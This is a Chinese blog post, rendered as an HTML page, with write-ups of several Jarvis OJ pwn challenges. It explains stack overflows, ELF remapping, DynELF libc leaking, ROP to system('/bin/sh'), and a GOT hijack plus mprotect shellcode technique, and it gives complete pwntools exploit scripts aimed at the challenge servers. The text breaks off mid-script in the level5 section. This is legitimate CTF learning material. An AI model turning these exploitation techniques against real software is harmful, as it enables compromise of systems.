@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="referrer" content="no-referrer" />
+  <!--解决简书外链403-->
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
+  
+  
+  
+  
+  <title>刷Jarvis OJ时学到的新姿势【不定时更新】 | Hacked By Fish_o0O</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="0x00 前言Pwn弱鸡，比赛划水，只好跟着大佬的博客刷刷一些题目才能维持尊严，在刷题目的时候又发现了一些新姿势，在此记录一下。持续龟速更新中">
+<meta property="og:type" content="article">
+<meta property="og:title" content="刷Jarvis OJ时学到的新姿势【不定时更新】">
+<meta property="og:url" content="http://fish-o0o.github.io/2020/03/12/%E5%88%B7Jarvis%20OJ%E6%97%B6%E5%AD%A6%E5%88%B0%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF[%E4%B8%8D%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0]/index.html">
+<meta property="og:site_name" content="Hacked By Fish_o0O">
+<meta property="og:description" content="0x00 前言Pwn弱鸡，比赛划水，只好跟着大佬的博客刷刷一些题目才能维持尊严，在刷题目的时候又发现了一些新姿势，在此记录一下。持续龟速更新中">
+<meta property="og:locale" content="zh">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/8447551-545bce443b11d001.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/8447551-b85c6c8312d3a637.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/8447551-d6dc96e030e77702.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/8447551-7d2b8d4476b77f40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/8447551-bc13f18d0f26d87b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/8447551-d7adfd25517acdaa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8447551-7f09e4432ad1ba4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8447551-66cc3ac5fdefc0ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8447551-2e89f9b95e1ebbc6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8447551-0888b24a3590c5ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8447551-f4fb179dc62b82ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8447551-f77ca0b794807b49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8447551-b2d699526ff69a70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="article:published_time" content="2020-03-12T20:30:43.943Z">
+<meta property="article:modified_time" content="2020-03-12T18:53:06.133Z">
+<meta property="article:author" content="Fish_o0O">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://upload-images.jianshu.io/upload_images/8447551-545bce443b11d001.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+  
+    <link rel="alternative" href="/atom.xml" title="Hacked By Fish_o0O" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/avatar.png" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Fish_o0O</a></h1>
+        </hgroup>
+        
+        <p class="header-subtitle">KEEEEEEEEEP STUDY！</p>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github"  target="_blank" href="/Fish_o0O" title="github">github</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Pwn/" style="font-size: 20px;">Pwn</a> <a href="/tags/Vulnerability/" style="font-size: 10px;">Vulnerability</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 15px;">随笔</a>
+                    </div>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                
+                    <div id="js-aboutme">一个被兴趣牵着鼻子走的菜鸡</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Fish_o0O</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/avatar.png" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Fish_o0O</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">KEEEEEEEEEP STUDY！</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="/Fish_o0O" title="github">github</a>
+                    
+                </div>
+            </nav>
+        </header>
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-刷Jarvis OJ时学到的新姿势[不定时更新]" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2020/03/12/%E5%88%B7Jarvis%20OJ%E6%97%B6%E5%AD%A6%E5%88%B0%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF%5B%E4%B8%8D%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0%5D/" class="article-date">
+      <time datetime="2020-03-12T20:30:43.943Z" itemprop="datePublished">2020-03-12</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      刷Jarvis OJ时学到的新姿势【不定时更新】
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Pwn弱鸡，比赛划水，只好跟着<a href="http://veritas501.space/2017/03/10/JarvisOJ_WP/" target="_blank" rel="noopener">大佬的博客</a>刷刷一些题目才能维持尊严，在刷题目的时候又发现了一些新姿势，在此记录一下。<strong>持续龟速更新中</strong></p>
+<a id="more"></a>
+<hr>
+<h2 id="0x01-200pt-Smashes"><a href="#0x01-200pt-Smashes" class="headerlink" title="0x01 200pt Smashes"></a>0x01 200pt Smashes</h2><p>程序很简单，利用<strong>gets函数</strong>接受<strong>Name</strong>导致溢出，溢出到<strong>stack_check_fail函数</strong>报错的地方将服务端的flag给打印出来<br><img src="http://upload-images.jianshu.io/upload_images/8447551-545bce443b11d001.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="主函数"><br><img src="http://upload-images.jianshu.io/upload_images/8447551-b85c6c8312d3a637.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="服务端的flag"><br>但有个很恶心的地方就是后面的循环函数，正如他所说的<strong>Please overwrite the flag</strong>，在这个地方有3个判断：</p>
+<ul>
+<li>如果你什么都不输入就直接跳到<strong>exit</strong>，根本不会触发<strong>stackcheckfail</strong>。</li>
+<li>输入<strong>n(n&lt;=32)</strong>个字符，就会将<strong>0x600d20+n</strong>的地方覆盖<strong>32-n</strong>个<strong>0</strong>，而这个地址恰好就是flag所在的地址，就是无论如何输入都会将<strong>0x600d20</strong>到<strong>0x600d40</strong>这段地址都会被我们所复写或者被<strong>memset</strong>给填充为<strong>0</strong></li>
+</ul>
+<p>然后就卡在这里了，一直想如何绕过这个循环，然鹅并没有卵用，绕不过去。最终参考了一下<strong>大佬的博客</strong>，发现Linux下有个机制<strong>ELF重映射</strong></p>
+<blockquote>
+<p>ELF重映射：当可执行文件足够小时，在不同的区段可能被多次映射。</p>
+</blockquote>
+<p>而这道题确实也就是考的这个，在gdb中可以看到在0x400000的地址将这个可执行文件重新映射了一遍，虽然我们覆盖掉了<strong>0x600d20</strong>处的flag但是在<strong>0x400d20</strong>处重映射的flag并没有被覆盖。<br><img src="http://upload-images.jianshu.io/upload_images/8447551-d6dc96e030e77702.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ELF重映射"><br>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./smashes'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'pwn.jarvisoj.com'</span> , <span class="number">9877</span>)<span class="comment">#nc pwn.jarvisoj.com 9877</span></span><br><span class="line">flag_addr = <span class="number">0x400D20</span></span><br><span class="line">p.recvuntil(<span class="string">'name? '</span>)</span><br><span class="line">name = p64(flag_addr) * <span class="number">100</span> <span class="comment">#懒到不想精确计算该改哪个位置于是直接暴力覆盖flag</span></span><br><span class="line">p.sendline(name)</span><br><span class="line">p.recvuntil(<span class="string">'flag: '</span>)</span><br><span class="line">p.send(<span class="string">'\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="0x02-250pt-level4"><a href="#0x02-250pt-level4" class="headerlink" title="0x02 250pt level4"></a>0x02 250pt level4</h2><p>前几个level都是简单常见的栈溢出、ROP，到了第四个就很有意思了，虽然程序都是一样的，却没有给libc版本，用leak出来的地址去查也没有查到，在<strong>大佬的博客</strong>中看到了<strong>pwntools</strong>中的<strong>dynelf</strong>方法。<br>看看<a href="http://pwntools.readthedocs.io/en/stable/dynelf.html" target="_blank" rel="noopener">pwntools官方文档</a>中的<strong>Example</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Assume a process or remote connection</span></span><br><span class="line">p = process(<span class="string">'./pwnme'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Declare a function that takes a single address, and</span></span><br><span class="line"><span class="comment"># leaks at least one byte at that address.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    data = p.read(address, <span class="number">4</span>)</span><br><span class="line">    log.debug(<span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># For the sake of this example, let's say that we</span></span><br><span class="line"><span class="comment"># have any of these pointers.  One is a pointer into</span></span><br><span class="line"><span class="comment"># the target binary, the other two are pointers into libc</span></span><br><span class="line">main   = <span class="number">0xfeedf4ce</span></span><br><span class="line">libc   = <span class="number">0xdeadb000</span></span><br><span class="line">system = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With our leaker, and a pointer into our target binary,</span></span><br><span class="line"><span class="comment"># we can resolve the address of anything.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># We do not actually need to have a copy of the target</span></span><br><span class="line"><span class="comment"># binary for this to work.</span></span><br><span class="line">d = DynELF(leak, main)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">'libc'</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># However, if we *do* have a copy of the target binary,</span></span><br><span class="line"><span class="comment"># we can speed up some of the steps.</span></span><br><span class="line">d = DynELF(leak, main, elf=ELF(<span class="string">'./pwnme'</span>))</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">'libc'</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># Alternately, we can resolve symbols inside another library,</span></span><br><span class="line"><span class="comment"># given a pointer into it.</span></span><br><span class="line">d = DynELF(leak, libc + <span class="number">0x1234</span>)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">'system'</span>)      == system</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>要使用<strong>dynelf</strong>首先得需要一个能够<strong>leak</strong>出地址的函数，然后需要知道<strong>main函数的地址</strong>或者直接有<strong>可执行文件</strong>，下面的一堆<strong>assert</strong>大概是校准？有了上述条件后<strong>dynelf</strong>就可以开始工作了，原理就是从内存里面逐个泄露出地址来暴力搜索想要找的函数。</p>
+</blockquote>
+<p>所以这道题的基本思路就是通过<strong>read函数</strong>溢出构造好<strong>leak函数</strong>，用<strong>dynelf</strong>在内存中暴力搜索<strong>system</strong>实际地址，然后构造简单rop写<strong>/bin/sh</strong>并调用system函数即可。脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./level4'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'pwn2.jarvisoj.com'</span> , <span class="number">9880</span>)<span class="comment">#nc pwn2.jarvisoj.com 9880</span></span><br><span class="line"></span><br><span class="line">p3ret = <span class="number">0x8048509</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span> </span><br><span class="line">	elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line">	pay = <span class="string">'a'</span>*<span class="number">0x88</span> +<span class="string">'bbbb'</span></span><br><span class="line">	pay += p32(elf.symbols[<span class="string">'write'</span>]) + p32(p3ret) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">	pay += p32(elf.symbols[<span class="string">'main'</span>])</span><br><span class="line">	p.sendline(pay)</span><br><span class="line">	data = p.recv(<span class="number">4</span>)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"[*]leaking: "</span> + data</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line">dyn =  DynELF(leak, elf=ELF(<span class="string">'./level4'</span>))</span><br><span class="line">bss_addr = <span class="number">0x804A024</span></span><br><span class="line">system_addr = dyn.lookup(<span class="string">'system'</span> , <span class="string">'libc'</span>)</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + <span class="string">'xebp'</span> + p32(read_plt) + p32(p3ret) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>) + p32(system_addr) + <span class="string">'xret'</span> + p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>但不太清楚为什么明明通过<strong>system(‘/bin/sh’)</strong>起的shell却只能执行一次命令。<br><img src="http://upload-images.jianshu.io/upload_images/8447551-7d2b8d4476b77f40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="只能执行一次命令"></p>
+<hr>
+<h2 id="0x03-300pt-level5"><a href="#0x03-300pt-level5" class="headerlink" title="0x03 300pt level5"></a>0x03 300pt level5</h2><p>从level0到level5的程序都是差不多的，考点也都是<strong>栈溢出</strong>，也就是说level5是最高难度的了。程序很简单，<del>可以直接溢出leak地址构rop起shell</del>，但那是level3_x64，虽然程序是一模一样的，同一个脚本也能pwn通，但是题目假设除了一个环境：<strong>mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。</strong>我跟着大牛的思路用<strong>mprotect函数</strong>，利用64位ELF文件的<strong>万能Gadget</strong>完成了本题。<br><img src="http://upload-images.jianshu.io/upload_images/8447551-bc13f18d0f26d87b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="主函数"></p>
+<blockquote>
+<p><strong>mprotect函数</strong><br>函数原型：<strong>int mprotect(const void *start, size_t len, int prot);</strong><br>函数功能：<strong>把自start开始的、长度为len的内存区的保护属性修改为prot指定的值</strong>，其中prot的值就和Linux系统对应的属性值。</p>
+</blockquote>
+<blockquote>
+<p><strong>万能Gadget</strong><br>在64位ELF文件中会有一个名叫<strong>__libc_csu_init</strong>的函数，看其中的汇编代码我们会发现可以通过我们的精心构造可以访问任何地方。我们可以先跳转到<strong>红色箭头</strong>的地方，控制<strong>rbx</strong>、<strong>rbp</strong>、<strong>r12</strong>、<strong>r13</strong>、<strong>r14</strong>、<strong>r15</strong>这五个寄存器中的值，然后再<strong>ret</strong>到<strong>蓝色箭头</strong>的地方，我们可以发现刚刚我们构造的<strong>r13</strong>、<strong>r14</strong>、<strong>r15</strong>中的值分别传递到了<strong>rdx</strong>、<strong>rsi</strong>、<strong>rdi</strong>寄存器中。而熟悉的人肯定知道<strong>rdi</strong>、<strong>rsi</strong>、<strong>rdx</strong>中的值分别对应64位程序中调用函数的前三个参数。而且在这几句后面还有个<strong>call</strong>，这就很骚了，虽然后面是<strong>call [r12+rbx*8]</strong>看似很复杂的汇编语言，但是我们可以发现<strong>r12</strong>和<strong>rbx</strong>的值在红色箭头那里我们都是可控的。如果我们将<strong>rbx</strong>中的值构造为<strong>0</strong>，<strong>r12</strong>的值构造为我们想要跳转到一个<strong>指针p</strong>，这个<strong>指针p</strong>指向我们想要执行的<strong>函数f</strong>，那么我们就可以执行<strong>函数f</strong>了。而且，ELF文件中的<strong>got表</strong>中就有我们想要的指向函数的指针。<br><img src="http://upload-images.jianshu.io/upload_images/8447551-d7adfd25517acdaa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="万能Gadget"></p>
+</blockquote>
+<ul>
+<li><strong>利用思路</strong><br>大概就是写<strong>shellcode</strong>到<strong>bss段</strong>，调用<strong>mprotect函数</strong>修改<strong>bss段</strong>为可执行，然后再跳转到<strong>bss段</strong>去执行我们的<strong>shellcode</strong>。首先将<strong>shellcode</strong>写到<strong>bss段</strong>就简单栈溢出调用<strong>read函数</strong>就能实现，而后面两步就需要用到<strong>万能Gadget</strong>访问函数，那么我们肯定是要<strong>hijack got表</strong>嘛，那就在<strong>got表</strong>里面找两个不太用的到的函数<strong>hijack</strong>一下呗。脚本如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./level5'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">	gdb.attach(p , open(<span class="string">'aa'</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'pwn2.jarvisoj.com'</span> , <span class="number">9884</span>)<span class="comment">#nc pwn2.jarvisoj.com 9884</span></span><br><span class="line">	libc = ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level5'</span>)</span><br><span class="line">offset = <span class="number">0x80</span></span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4006b1</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret = <span class="number">0x4006a6</span></span><br><span class="line">evercall_addr = <span class="number">0x400690</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#step1 leak libc.addr</span></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">payload1 = <span class="string">'a'</span> * offset + <span class="string">'__xebp__'</span> + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_r15_ret) + p64(read_got) + <span class="string">'deadbeef'</span> + p64(write_plt) + p64(main_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>)) - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#step2 hijack __libc_start_main -&gt; mprotect</span></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">payload2 = <span class="string">'a'</span> * offset + <span class="string">'__xebp__'</span> + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_r15_ret) + p64(libc_start_main_got) + <span class="string">'deadbeef'</span> + p64(read_plt) + p64(main_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">mprotect_addr = libc.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(mprotect_addr)</span><br><span class="line">p.send(p64(mprotect_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#step3 write shellcode -&gt; bss</span></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">payload3 = <span class="string">'a'</span> * offset + <span class="string">'__xebp__'</span> + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_r15_ret) + p64(bss_addr) + <span 